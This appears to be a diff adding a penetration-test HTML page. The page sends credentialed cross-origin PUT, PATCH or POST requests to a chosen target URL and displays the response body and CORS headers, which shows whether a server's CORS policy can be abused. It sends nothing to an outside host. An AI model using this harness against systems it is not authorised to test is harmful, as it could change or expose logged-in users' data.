@@ -1,0 +1,84 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>CORS PoC — Methods (no exfil)</title>
+<style>
+  body{font:14px/1.5 system-ui;margin:24px}
+  textarea,input,select{width:100%;max-width:920px}
+  pre{white-space:pre-wrap;background:#111;color:#0f0;padding:12px;border-radius:8px}
+  .row{max-width:960px}
+  .err{color:#b00}
+</style>
+
+<h1>CORS PoC — PUT/PATCH/POST (no exfil)</h1>
+<div class="row">
+  <label>URL <input id="url" value="https://target.example.com/resource"></label><br>
+  <label>Method
+    <select id="method">
+      <option>POST</option><option>PUT</option><option>PATCH</option>
+    </select>
+  </label><br>
+  <label>Custom request headers (name: value, one per line)
+    <textarea id="hdrs" rows="4">Content-Type: application/json</textarea>
+  </label><br>
+  <label>Body
+    <textarea id="body" rows="6">{"probe":true}</textarea>
+  </label><br>
+  <label><input type="checkbox" id="creds" checked> Use cookies (credentials)</label>
+  <button id="run">Run</button>
+</div>
+
+<h2>Result</h2>
+<div id="meta"></div>
+<pre id="out">(no run yet)</pre>
+
+<script>
+(function(){
+  function $(id){return document.getElementById(id);}
+  function esc(s){return String(s).replace(/[&<>]/g,function(m){return {'&':'&amp;','<':'&lt;','>':'&gt;'}[m];});}
+
+  $('run').onclick = async function(){
+    var url = $('url').value.trim();
+    var method = $('method').value;
+    var creds = $('creds').checked;
+    var hdrLines = $('hdrs').value.split(/\r?\n/).map(function(l){return l.trim();}).filter(Boolean);
+    var headers = {};
+    for (var i=0;i<hdrLines.length;i++){
+      var m = hdrLines[i].split(':');
+      if (m.length >= 2) headers[m[0].trim()] = m.slice(1).join(':').trim();
+    }
+    var body = $('body').value;
+
+    $('meta').innerHTML =
+      '<p><strong>PoC Origin:</strong> '+esc(location.origin)+
+      '<br><strong>Method:</strong> '+esc(method)+
+      ' &nbsp; <strong>Credentials:</strong> '+creds+'</p>';
+    $('out').textContent = 'Fetching…';
+
+    try{
+      var r = await fetch(url, {
+        method: method,
+        mode: 'cors',
+        credentials: creds ? 'include' : 'omit',
+        headers: headers,
+        body: body
+      });
+      var acao = r.headers.get('access-control-allow-origin');
+      var acac = r.headers.get('access-control-allow-credentials');
+      var acam = r.headers.get('access-control-allow-methods');
+      var acah = r.headers.get('access-control-allow-headers');
+      var txt  = await r.text();
+
+      var meta = '<p><strong>Status:</strong> '+r.status+
+        '<br><strong>ACAO:</strong> '+esc(acao)+
+        ' &nbsp; <strong>ACAC:</strong> '+esc(acac)+
+        '<br><strong>ACAM:</strong> '+esc(acam)+
+        '<br><strong>ACAH:</strong> '+esc(acah)+'</p>';
+      $('meta').insertAdjacentHTML('beforeend', meta);
+      $('out').textContent = txt;
+    }catch(e){
+      $('out').classList.add('err');
+      $('out').textContent = 'CORS blocked or network error: ' + e;
+    }
+  };
+})();
+</script>
